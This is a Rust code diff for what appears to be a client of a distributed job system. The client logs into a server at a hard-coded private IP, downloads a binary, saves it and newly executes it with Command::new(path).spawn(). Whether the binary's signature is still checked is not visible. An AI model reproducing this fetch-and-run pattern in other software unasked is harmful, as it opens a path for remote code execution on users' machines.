@@ -2,42 +2,29 @@ use reqwest::StatusCode;
 use serde::{Deserialize, Serialize};
 use sha2::digest::Reset;
 use sha2::{Digest, Sha256, Sha512};
-use shared::{api::*, challenge::Challenge, utils::sha256};
+use shared::{api::*, challenge::Challenge, utils};
 use std::fs;
 use std::fs::{read, File};
 use std::io::Write;
 use std::mem::swap;
 use std::str::FromStr;
+use std::process::Command;
 
 fn main() {
-    let mut api_client = Api::new("10.211.55.2", 8000, false);
+    utils::chdir();
 
+    // check if we should smth do?
+    // todo: ...
+
+    let mut api_client = Api::new("10.211.55.2", 8000, false);
     api_client.login(&SystemInfo {
         cpu_total: 0.0,
         mem_total: 0.0
     }).unwrap();
 
     let upload = api_client.client_download().unwrap();
+    let path = utils::save(upload).unwrap();
 
-    save(upload);
-
-    return;
-}
-
-fn save(upload: UploadParameters) {
-    let bytes = base64::decode(&upload.base64).unwrap();
-
-    // verify binary against signature?
-    let sign_ok =
-        shared::utils::verify_sign(&bytes, &upload.sign, &shared::utils::KEY.lock().unwrap())
-            .unwrap();
-
-    if !sign_ok {
-        return panic!();
-    }
-
-    // save binary
-    let digest = hex::encode(sha256(&bytes));
-    let mut file = File::create(format!("{}.exe", &digest)).unwrap();
-    file.write_all(&bytes).unwrap();
+    // run program!
+    Command::new(path).spawn().unwrap();
 }
